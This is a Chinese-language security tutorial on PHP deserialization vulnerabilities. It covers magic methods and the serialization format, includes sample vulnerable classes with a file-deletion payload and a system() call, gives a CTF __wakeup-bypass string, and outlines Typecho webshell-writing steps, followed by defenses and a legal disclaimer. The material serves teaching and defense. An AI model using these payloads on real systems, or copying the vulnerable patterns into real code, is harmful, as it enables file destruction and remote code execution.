
## 目录
1. [PHP类与对象基础](#php类与对象基础)
2. [Magic函数详解](#magic函数详解)
3. [序列化与反序列化机制](#序列化与反序列化机制)
4. [反序列化漏洞原理与利用](#反序列化漏洞原理与利用)
5. [CTF实战案例分析](#ctf实战案例分析)
6. [Typecho反序列化漏洞案例](#typecho反序列化漏洞案例)
7. [防御与修复方案](#防御与修复方案)
8. [法律声明](#法律声明)

---

## PHP类与对象基础

### 类（Class）与对象（Object）
- **类定义**：共享相同结构和行为的对象集合。
  ```php
  class MyClass {
      public $var1;
      protected $var2 = "constant string";
      public function myfunc($arg1, $arg2) { /*...*/ }
  }
  ```
- **对象实例化**：通过 `new` 关键字创建实例。
  ```php
  $obj = new MyClass();
  ```

### 类的成员
- **属性**：类的变量（`public`、`protected`、`private`）。
- **方法**：类的函数，定义对象行为。

---

## Magic函数详解

### 核心Magic函数
| 函数             | 触发条件                                      | 作用                                                                 |
|------------------|---------------------------------------------|----------------------------------------------------------------------|
| `__construct()`  | 对象创建时                                    | 初始化对象属性                                                       |
| `__destruct()`   | 对象销毁或脚本结束时                          | 清理资源（如关闭文件、数据库连接）                                     |
| `__toString()`   | 对象被当作字符串使用（如 `echo $obj`）         | 定义对象的字符串表示形式                                               |
| `__sleep()`      | 调用 `serialize()` 前                         | 返回需序列化的属性列表（控制序列化内容）                                |
| `__wakeup()`     | 调用 `unserialize()` 后                       | 恢复对象资源（如重新连接数据库）                                       |
| `__call()`       | 调用不可访问的非静态方法                       | 动态处理方法调用（用于实现方法重载）                                   |

### PHP 7.4+新增函数
- `__serialize()` 和 `__unserialize()`：替代 `__sleep()` 和 `__wakeup()`，优先级更高。

---

## 序列化与反序列化机制

### 序列化格式
| 类型      | 序列化格式示例                                 |
|-----------|----------------------------------------------|
| 字符串     | `s:5:"Hello";`                               |
| 整数       | `i:123;`                                     |
| 布尔值     | `b:1;`（`true`）或 `b:0;`（`false`）          |
| 对象       | `O:8:"MyClass":2:{s:3:"var";s:5:"value";}`   |
| 数组       | `a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}`         |

### 反序列化过程
1. **输入可控性**：通过用户输入（如 `$_GET`）传递序列化字符串。
2. **对象重建**：调用 `unserialize()` 时触发 `__wakeup()`（若存在）。
3. **漏洞触发点**：若反序列化后的对象属性被用于危险操作（如文件删除、命令执行）。

---

## 反序列化漏洞原理与利用

### 漏洞条件
4. **可控输入**：`unserialize()` 的参数来自外部（如 `$_GET['data']`）。
5. **危险Magic方法**：如 `__destruct()` 调用 `unlink($this->file)`。
6. **属性可操控**：攻击者通过修改序列化字符串中的属性值控制操作目标。

### 利用示例：文件删除
```php
// 漏洞代码
class Logger {
    public $logfile = "default.log";
    public function __destruct() {
        unlink($this->logfile);
    }
}
// 攻击Payload：修改 logfile 为敏感文件
$payload = 'O:6:"Logger":1:{s:7:"logfile";s:9:"index.php";}';
unserialize($_GET['data']);
```

### 命令执行（利用 `__invoke()`）
```php
class Executor {
    public $cmd = "whoami";
    public function __invoke() {
        system($this->cmd);
    }
}
// 序列化后触发：$obj();
```

---

## CTF实战案例分析

### 题目：攻防世界 `unserialize3`
- **目标**：绕过 `__wakeup()` 触发 `exit()`。
- **利用CVE-2016-7124**：当对象属性数量大于实际值时，跳过 `__wakeup()`。
  ```php
  // 正常序列化
  O:4:"xctf":1:{s:4:"flag";s:3:"111";}
  // 修改属性数量为2
  O:4:"xctf":2:{s:4:"flag";s:3:"111";}
  ```

---

## Typecho反序列化漏洞案例

### 漏洞背景（CVE-2018-18753）
- **影响版本**：Typecho v1.0-14.10.10。
- **漏洞点**：`install.php` 未过滤反序列化输入。
- **利用链**：通过 `__destruct()` 触发文件写入或代码执行。

### 复现步骤
7. **搭建环境**：PHP 5.4 + Typecho 1.0。
8. **构造Payload**：序列化恶意对象控制文件路径。
9. **触发漏洞**：通过HTTP请求传递Payload，写入Webshell。

---

## 防御与修复方案

### 代码层防御
10. **避免反序列化用户输入**：使用JSON或其他安全格式替代。
11. **限制反序列化类**：白名单机制。
   ```php
   $allowed_classes = ['SafeClass'];
   unserialize($data, ['allowed_classes' => $allowed_classes]);
   ```
12. **禁用危险Magic方法**：如避免在 `__destruct()` 中执行敏感操作。

### 框架级修复
- **升级PHP版本**：>=7.4 使用 `__serialize()` 和 `__unserialize()`。
- **依赖库更新**：及时修补已知漏洞（如Typecho官方补丁）。

### 安全审计工具
- **RIPS**：静态代码分析工具检测反序列化漏洞。
- **PHPStan**：代码质量工具检查危险函数调用。

---

## 法律声明
> **《中华人民共和国网络安全法》第二十七条**  
> 任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。  
> **本文档内容仅供安全研究与防御技术学习，严禁用于非法用途！**
```